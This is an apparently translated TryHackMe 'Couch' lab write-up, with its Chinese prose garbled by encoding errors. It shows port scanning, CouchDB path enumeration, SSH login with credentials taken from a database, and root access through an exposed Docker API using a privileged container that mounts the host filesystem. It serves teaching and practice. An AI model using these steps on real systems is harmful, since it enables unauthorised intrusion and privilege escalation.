<html>
<head>
<title>TryHackMe Writeup â€” Couch</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMeæŠ¥é“â€”æ²™å‘</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-writeup-couch-a82d46bff231?source=collection_archive---------2-----------------------#2021-09-29">https://infosecwriteups.com/tryhackme-writeup-couch-a82d46bff231?source=collection_archive---------2-----------------------#2021-09-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="1422" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å—¨ï¼Œä¼™è®¡ä»¬ï¼Œåˆå’Œç‰¹é‡Œå“ˆå…‹å§†withç©å¾—å¼€å¿ƒäº†ã€‚æ‰€ä»¥ï¼Œè¿™é‡Œæ˜¯é€šè¿‡è¿™ä¸ª<strong class="js iu">æ²™å‘</strong>æŒ‘æˆ˜çš„è®°å½•å’ŒæŒ‡å—ã€‚è¿™ä¸ªCTFæˆ¿é—´æ˜¯ç”±CTFæƒ…äººä¸ºCTFæƒ…äººè®¾è®¡çš„ã€‚</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ca"><img src="../Images/5f25e7d0addb0ac72c6262bfa7d7fcb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*xVW-SHmNtWsoXAFn"/></div></div></figure><p id="123b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">æˆ¿é—´</strong>:<a class="ae kz" href="https://tryhackme.com/room/couch" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/couch</a><br/><strong class="js iu">çº§åˆ«</strong>:ç®€å•(åˆå­¦è€…å®¹æ˜“)</p><p id="53ea" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated"><strong class="js iu">ä»»åŠ¡</strong>:åœ¨è¿™ä¸ªåŠå¼•å¯¼çš„æŒ‘æˆ˜ä¸­ï¼Œé»‘è¿›ä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ•°æ®åº“æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨ä»¥åŸºäºJSONçš„æ–‡æ¡£æ ¼å¼æ”¶é›†å’Œå­˜å‚¨æ•°æ®ã€‚</p><h1 id="49a3" class="la lb it bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">æˆ‘ä»¬å¼€å§‹å§</h1><p id="eac9" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œå¯åŠ¨æœºå™¨å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€IPï¼Œä½†çœ‹èµ·æ¥ç«¯å£80ä¸å¯ç”¨</p><p id="b1da" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è®©æˆ‘ä»¬è¿è¡Œç«¯å£æ‰«æ</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="6b01" class="mi lb it me b gy mj mk l ml mm"># nmap -A -T4 -sS -sV -p- 10.10.X.X<br/>...<br/>...<br/>PORT     STATE SERVICE VERSION<br/><strong class="me iu">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</strong><br/>| ssh-hostkey:<br/>|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)<br/>|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)<br/>|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)<br/><strong class="me iu">5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)</strong><br/>|_http-title: Site doesn't have a title (text/plain; charset=utf-8).<br/>|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)<br/>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span></pre><p id="511d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">2ä¸ªç«¯å£æ‰“å¼€(22å’Œ5984)ã€‚5984æŒ‡çš„æ˜¯<a class="ae kz" href="http://couchdb.apache.org/" rel="noopener ugc nofollow" target="_blank"> Apache CouchDB </a>ã€‚æ‰“å¼€10.10.x.x:5984æ˜¾ç¤º</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="a62e" class="mi lb it me b gy mj mk l ml mm">{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}</span></pre><p id="3e07" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è®©æˆ‘ä»¬å…ˆè·‘æ­¥ï¼Œç„¶åæˆ‘ä»¬æ¥å›ç­”é—®é¢˜</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="dab3" class="mi lb it me b gy mj mk l ml mm">&gt; feroxbuster --url http://10.10.X.X:5984/ -w ~/wordlists/dirb/big.txt -t 60 -C 404,403</span><span id="4a58" class="mi lb it me b gy mq mk l ml mm">200        1l       80w     4808c <a class="ae kz" href="http://10.10.136.186:5984/_config" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_config</a><br/>200       12l      166w        0c <a class="ae kz" href="http://10.10.136.186:5984/_log" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_log</a><br/>405        1l        3w       60c <a class="ae kz" href="http://10.10.136.186:5984/_plugins" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_plugins</a><br/>200        1l      156w     4627c <a class="ae kz" href="http://10.10.136.186:5984/_stats" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_stats</a><br/>301        0l        0w        0c <a class="ae kz" href="http://10.10.136.186:5984/_utils" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_utils</a><br/>200        1l        1w      230c <a class="ae kz" href="http://10.10.136.186:5984/_users" rel="noopener ugc nofollow" target="_blank">http://10.10.136.186:5984/_users</a><br/>.....<br/>.....</span></pre><p id="fb67" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æœ‰ä¸€äº›å¯ç”¨çš„è·¯å¾„å¯ä»¥è¢«è®¿é—®ï¼Œé™¤äº†<code class="fe mn mo mp me b">_utils</code>è·¯å¾„å¤–ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯JSONè¾“å‡ºã€‚æ²¡å…³ç³»ï¼Œè®©æˆ‘ä»¬å…ˆæŠŠé—®é¢˜è¿‡ä¸€é</p><h2 id="763b" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">æ‰«ææœºå™¨ã€‚å¼€æ”¾äº†å¤šå°‘ä¸ªç«¯å£ï¼Ÿ</h2><p id="1c9c" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">å‘ç°æœ‰2ä¸ªç«¯å£æ‰“å¼€(22å’Œ5984)</p><h2 id="793d" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">æœåŠ¡å™¨ä¸Šå®‰è£…çš„æ˜¯ä»€ä¹ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Ÿ</h2><p id="178f" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">å®‰è£…çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ˜¯<a class="ae kz" href="http://couchdb.apache.org/" rel="noopener ugc nofollow" target="_blank"> Apache CouchDB </a></p><h2 id="6f41" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">æ•°æ®åº“ç®¡ç†ç³»ç»Ÿè¿è¡Œåœ¨å“ªä¸ªç«¯å£ä¸Šï¼Ÿ</h2><p id="b624" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">couchDB = 5984çš„ç«¯å£</p><h2 id="66b8" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">æœåŠ¡å™¨ä¸Šå®‰è£…çš„ç®¡ç†ç³»ç»Ÿæ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Ÿ</h2><p id="d265" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">æ­£å¦‚JSONå­—ç¬¦ä¸²ä¸­æåˆ°çš„ï¼Œç‰ˆæœ¬æ˜¯1.6.1</p><h2 id="9bc5" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">è¿™ä¸ªæ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„webç®¡ç†å·¥å…·çš„è·¯å¾„æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p id="1de8" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">åŸºäºferoxbusterç»“æœï¼Œ<code class="fe mn mo mp me b"><strong class="js iu"><em class="nc">_utils</em></strong></code>æ˜¯æ­£ç¡®è·¯å¾„</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi nd"><img src="../Images/4d956c0094869cea31dbb9fb265c1c80.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dWjcq8Fi0VyYReII9qiSYw.png"/></div></div></figure><h2 id="b4b1" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">åœ¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„webæµè§ˆå™¨ä¸­åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“çš„è·¯å¾„æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p id="5c27" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">å‚è€ƒcouchDBæ–‡æ¡£ï¼Œå…¶æ˜ç¡®è¡¨ç¤º<strong class="js iu"> <em class="nc"> _all_dbs </em> </strong>è·¯å¾„</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ne"><img src="../Images/39829e85893290a1932b45a04d8219dd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tyG0kyGcKx8wqI0ORDk88A.png"/></div></div></figure><h2 id="75aa" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">webç®¡ç†å·¥å…·ä¸­æœ‰å“ªäº›å‡­æ®ï¼Ÿ</h2><p id="5155" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">æµè§ˆæ‰€æœ‰å¯ç”¨çš„å¯ç‚¹å‡»é¡¹ç›®ï¼Œå¹¶åœ¨â€œç§˜å¯†â€æ•°æ®åº“ä¸­æ‰¾åˆ°ç”¨æˆ·å‡­è¯</p><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi nf"><img src="../Images/6a10d35822a74ee39664b272b8df2493.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gpa4c54z1jrIQLnalmL67A.png"/></div></div></figure><h2 id="b33c" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">å±åŠæœºå™¨å®‰å…¨å¹¶æ‰¾åˆ°user.txt</h2><p id="b720" class="pw-post-body-paragraph jq jr it js b jt ly jv jw jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn im bi translated">å› ä¸ºæ²¡æœ‰è¡¨å•ç™»å½•æˆ–ä»»ä½•é¡µé¢æ¥æ”¾ç½®å‡­è¯ï¼Œæ‰€ä»¥å¯èƒ½æ˜¯SSHç™»å½•ï¼Œå› ä¸ºç«¯å£22æ˜¯æ‰“å¼€çš„</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="c27c" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">&gt; ssh atena@10.10.X.X<br/></strong>The authenticity of host '10.10.X.X (10.10.X.X)' can't be established.<br/>ECDSA key fingerprint is SHA256:TtfUUNS6Ivob4iQ7X414863lCCc1q2YyzzycIkRTZ3k.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added '10.10.X.X' (ECDSA) to the list of known hosts.<br/><strong class="me iu">atena@10.10.X.'s password:</strong></span><span id="e6ab" class="mi lb it me b gy mq mk l ml mm">Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)</span><span id="fd22" class="mi lb it me b gy mq mk l ml mm">* Documentation:  <a class="ae kz" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/>* Management:     <a class="ae kz" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/>* Support:        <a class="ae kz" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a><br/>Last login: Fri Dec 18 15:25:27 2020 from 192.168.85.1</span><span id="3a91" class="mi lb it me b gy mq mk l ml mm"><strong class="me iu">atena@ubuntu</strong>:<strong class="me iu">~</strong>$</span></pre><p id="6f5c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ç°åœ¨ä½¿ç”¨atenaç”¨æˆ·æˆåŠŸè¿›å…¥UbuntuæœåŠ¡å™¨ã€‚æˆ‘ä»¬æ¥æ‰¾user.txtã€‚</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="eb25" class="mi lb it me b gy mj mk l ml mm">&gt; cat users.txt<br/>THM{1ns3cure_XXXXXX}</span></pre><p id="9196" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">çœŸå¿«ã€‚LOLã€‚æœ€åï¼Œæˆ‘ä»¬æ¥æ ¹ï¼</p><h2 id="b203" class="mi lb it bd lc mr ms dn lg mt mu dp lk kb mv mw lo kf mx my ls kj mz na lw nb bi translated">æå‡æƒé™å¹¶è·å–root.txt</h2><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="2ad0" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">atena@ubuntu</strong>:<strong class="me iu">~</strong>$ sudo -l<br/>[sudo] password for atena:<br/>Sorry, user atena may not run sudo on ubuntu.</span></pre><p id="2a1a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å¥½å§~~æœ€å®¹æ˜“çš„éƒ¨åˆ†è¢«å±è”½äº†ã€‚æ£€æŸ¥æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„crontabï¼Œä½†ä¸æ£€æŸ¥ä»»ä½•ä¸€ä¸ªã€‚è®©æˆ‘ä»¬çœ‹çœ‹å†å²å§ï¼Œ</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="b13b" class="mi lb it me b gy mj mk l ml mm">cat ~/.bash_history</span></pre><figure class="ko kp kq kr gt ks gh gi paragraph-image"><div role="button" tabindex="0" class="kt ku di kv bf kw"><div class="gh gi ng"><img src="../Images/9ba93e62a135a4a946e5f2c1f85b0077.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CdxbwaH2c2yZRY5GDOAZFQ.png"/></div></div></figure><p id="05ad" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è¯¥ä¸»æœºä¸­æ­£åœ¨è¿è¡Œdockerã€‚è®©æˆ‘ä»¬è¿è¡Œç å¤´</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="a167" class="mi lb it me b gy mj mk l ml mm"><strong class="me iu">&gt; docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine</strong><br/>/ # id<br/><strong class="me iu">uid=0(root) </strong>gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span></pre><p id="be9a" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">å¥½..è¿™æ˜¯æ ¹..æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œæšä¸¾æ–‡ä»¶ï¼Œ</p><pre class="ko kp kq kr gt md me mf mg aw mh bi"><span id="8072" class="mi lb it me b gy mj mk l ml mm">&gt; find . -name root.txt<br/>./mnt/root/root.txt</span><span id="24db" class="mi lb it me b gy mq mk l ml mm">&gt; cat mnt/root/root.txt<br/><strong class="me iu">THM{RCE_us1ng_XXXXXXXXXXX}</strong></span></pre><p id="6e8b" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">è¿™æ˜¯CTFæœ‰å²ä»¥æ¥æœ€å¿«çš„ä¸€æ¬¡ã€‚é¡ºä¾¿è¯´ä¸€å¥ï¼Œæˆ‘çœŸçš„å¾ˆå–œæ¬¢CTF..</p><p id="55c5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">æ„Ÿè°¢æ‚¨çš„é˜…è¯»ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚ğŸ¤˜</p></div></div>    
</body>
</html>